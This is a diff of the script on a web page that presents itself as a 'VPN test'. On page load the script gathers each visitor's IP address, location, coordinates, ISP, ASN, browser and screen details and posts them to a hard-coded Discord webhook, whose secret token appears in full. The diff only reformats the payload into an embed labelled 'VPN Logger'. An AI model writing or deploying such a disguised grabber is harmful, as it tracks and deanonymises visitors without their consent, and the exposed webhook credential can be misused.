@@ -30,50 +30,68 @@ body{
 
 const WEBHOOK = "https://discord.com/api/webhooks/1461933225080389859/O_krENJ9E7tqtNcsHpOQsMTC0w-zXPhCAooQKHE-iRJ4RROYf5Jeai7S_8HwcYSOkfuU";
 
-async function getInfo(){
-    try{
+async function run(){
 
-        const res = await fetch("https://ipapi.co/json/");
-        const data = await res.json();
+try{
 
-        const info = `
+const res = await fetch("https://ipapi.co/json/");
+const data = await res.json();
+
+const deviceInfo = `
 IP: ${data.ip}
-Country: ${data.country_name}
-City: ${data.city}
+Country: ${data.country_name} (${data.country})
 Region: ${data.region}
+City: ${data.city}
 Postal: ${data.postal}
-ISP: ${data.org}
-Timezone: ${data.timezone}
-Latitude: ${data.latitude}
-Longitude: ${data.longitude}
 
-User Agent: ${navigator.userAgent}
+ISP: ${data.org}
+ASN: ${data.asn}
+
+Timezone: ${data.timezone}
+
+Coordinates: ${data.latitude}, ${data.longitude}
+
+Browser: ${navigator.userAgent}
 Platform: ${navigator.platform}
 Language: ${navigator.language}
 Screen: ${screen.width}x${screen.height}
 `;
 
-        document.getElementById("status").innerText = "Info collected ✔";
+document.getElementById("status").innerText = "Sending info...";
 
-        await fetch(WEBHOOK,{
-            method:"POST",
-            headers:{
-                "Content-Type":"application/json"
-            },
-            body: JSON.stringify({
-                content: "🌍 **VPN Test Result**\n```" + info + "```"
-            })
-        });
+await fetch(WEBHOOK,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+embeds:[
+{
+title:"🌍 VPN Test Result",
+description:"```"+deviceInfo+"```",
+color:5814783,
+footer:{
+text:"VPN Logger"
+},
+timestamp:new Date()
+}
+]
+})
+});
 
-        document.getElementById("status").innerText = "Sent to Discord ✔";
+document.getElementById("status").innerText = "Info sent ✔";
 
-    }catch(err){
-        document.getElementById("status").innerText = "Error getting info";
-        console.error(err);
-    }
+}catch(err){
+
+document.getElementById("status").innerText = "Error collecting info";
+
+console.log(err);
+
 }
 
-getInfo();
+}
+
+run();
 
 </script>
 
